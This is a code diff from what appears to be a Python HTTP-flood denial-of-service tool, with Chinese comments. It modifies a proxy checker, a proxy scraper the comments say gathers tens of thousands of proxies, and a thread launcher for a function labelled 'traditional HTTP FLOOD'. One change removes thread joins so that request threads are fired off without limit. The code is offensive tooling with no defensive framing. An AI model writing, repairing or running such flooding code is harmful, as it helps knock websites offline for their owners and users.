@@ -117,7 +117,8 @@ def check_proxy(proxy): # 檢測proxy的TCP connection跟HTTP REQUESTS
     proxy_ip, proxy_port = proxy.strip().split(":")
     proxy_port = int(proxy_port)
 
-    s = socks.socksocket()
+    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.set_proxy(socks.HTTP, proxy_ip, proxy_port)
     s.settimeout(2)
 
@@ -315,6 +316,7 @@ def ProxyScraper(): # 抓取proxy的 , 用了無數次 可以肯定的說 50~70k
             for lines in lst:
                 if len(lines) > 10 and len(lines) < 22:
                     download_proxy.append(lines)
+
     uni_ip = set()
     result = []
     for item in download_proxy:
@@ -323,7 +325,7 @@ def ProxyScraper(): # 抓取proxy的 , 用了無數次 可以肯定的說 50~70k
             uni_ip.add(p_ip)
             result.append(item)
 
-    download_proxy = sorted(result)
+    download_proxy = sorted(set(result))
 
 
 def launchThreads():
@@ -331,11 +333,8 @@ def launchThreads():
         try:
             t = threading.Thread(target=send_requests)
             t.start()
-            th_list.append(t)
         except:
             pass
-    for th in th_list:
-        th.join()
 
 
 def send_requests(): #傳統HTTP FLOOD
